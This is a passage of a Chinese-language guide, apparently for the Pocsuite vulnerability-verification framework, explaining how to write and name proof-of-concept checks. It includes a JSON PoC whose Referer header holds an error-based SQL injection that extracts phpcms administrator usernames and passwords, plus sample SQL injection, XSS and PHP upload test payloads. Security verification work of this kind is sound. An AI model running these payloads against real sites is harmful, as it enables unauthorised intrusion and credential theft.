                "<span class="hljs-attribute">vulPath</span>": <span class="hljs-value"><span class="hljs-string">"/data/js.php"</span></span>,
                "<span class="hljs-attribute">params</span>": <span class="hljs-value"><span class="hljs-string">"id=1"</span></span>,
                "<span class="hljs-attribute">necessary</span>": <span class="hljs-value"><span class="hljs-string">""</span></span>,
                "<span class="hljs-attribute">headers</span>": <span class="hljs-value">{"<span class="hljs-attribute">Referer</span>":<span class="hljs-value"><span class="hljs-string">"1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),char(45,45),(SELECT concat(username,char(45,45,45),password,char(45,45)) from phpcms_member limit 1))a from information_schema.tables group by a)b), '0')#"</span></span>}</span>,
                "<span class="hljs-attribute">status</span>":<span class="hljs-value"><span class="hljs-string">"200"</span></span>,
                "<span class="hljs-attribute">match</span>":<span class="hljs-value">{
                    "<span class="hljs-attribute">regex</span>": <span class="hljs-value">[<span class="hljs-string">"Duplicate"</span>]</span>,
                    "<span class="hljs-attribute">time</span>": <span class="hljs-value"><span class="hljs-string">""</span>
                </span>}</span>,
                "<span class="hljs-attribute">result</span>":<span class="hljs-value">{
                    "<span class="hljs-attribute">AdminInfo</span>":<span class="hljs-value">{
                        "<span class="hljs-attribute">Username</span>":<span class="hljs-value"><span class="hljs-string">"&lt;regex&gt;--(.+)---"</span></span>,
                        "<span class="hljs-attribute">Password</span>": <span class="hljs-value"><span class="hljs-string">"&lt;regex&gt;---(.+)--"</span>
                    </span>}
                </span>}
            </span>}
        ]
    </span>}
</span>}
</code></pre><h4 id="poc-a-id-pocstandard-a-">PoC 规范说明<a id="pocstandard"></a></h4>
<h4 id="poc-a-id-named-a-">PoC 命名规范<a id="named"></a></h4>
<p> PoC 命名分成 3 个部分组成漏洞应用名<em>版本号</em>漏洞类型名称 然后把文件名中的所有字母改写为小写，所有的符号改成_。文件名不能有特殊字符和大写字母。 规范的文件名示例</p>
<pre class="hljs"><code>    _1847_seeyon_3_1_login_info_disclosure.py
</code></pre><h4 id="-a-id-category-a-">漏洞类型规范<a id="category"></a><a></a></h4><a>
</a><p><a>参考</a><a href="http://seebug.org/category">漏洞分类</a></p>
<h4 id="poc-a-id-notice-a-">PoC 编写注意事项<a id="notice"></a></h4>
<p>1、 Verify 模式为了防止误报的产生,我们一般使用的让页面输出一个自定义的字符串。</p>
<p>比如:</p>
<p>检测 SQL 注入时,<code>select md5(0x2333333)</code></p>
<pre class="hljs markdown"><code>if '5e2e9b556d77c86ab48075a94740b6f7' in content:
  result['VerifyInfo'] = {}
  result[<span class="hljs-link_label">'VerifyInfo'</span>][<span class="hljs-link_reference">'URL'</span>] = self.url+payload
</code></pre><p>检测 XSS 漏洞时<code>alert('&lt;0x2333333&gt;')</code></p>
<pre class="hljs markdown"><code>if '<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-title">0x2333333</span>&gt;</span></span>' in content:
  result['VerifyInfo'] = {}
  result[<span class="hljs-link_label">'VerifyInfo'</span>][<span class="hljs-link_reference">'URL'</span>] = self.url+payload
</code></pre><p>检测 PHP 文件上传是否成功。<code>&lt;?php echo md5(0x2333333);unlink(__FILE__);?&gt;</code></p>
<pre class="hljs markdown"><code>if '5e2e9b556d77c86ab48075a94740b6f7' in content:
  result['VerifyInfo'] = {}
  result[<span class="hljs-link_label">'VerifyInfo'</span>][<span class="hljs-link_reference">'URL'</span>] = self.url+payload
</code></pre><p>2、 任意文件如果需要知道网站路径才能读取文件的话,可以读取系统文件进行验证,要写 Windows 版和 Linux 版两个版本。</p>
<p>3、 Verify 模式下,上传的文件一定要删掉</p>
<p>4、 程序可以通过某些方法获取表前缀，just do it；若不行，保持默认表前缀</p>
<p>5、 PoC 编写好后，务必进行测试，测试规则为：5个不受漏洞的网站，确保 PoC 攻击不成功；5个受漏洞影响的网站，确保 PoC 攻击成功。</p>
<p>###运行程序<a id="run"></a></p>
<p><video width="550" height="400" controls="controls" style="margin-top:-30px;">
   <source src="/static/images/pocsuite_demo.mp4" type="video/mp4">pocsuite_demo.mp4
          您的浏览器不支持 video 标签
</video></p>
<ul>
<li>如果浏览器不支持播放，请直接访问 <a href="/static/images/pocsuite_demo.mp4">pocsuite_demo.mp4</a></li>
</ul>
</div>

        </section>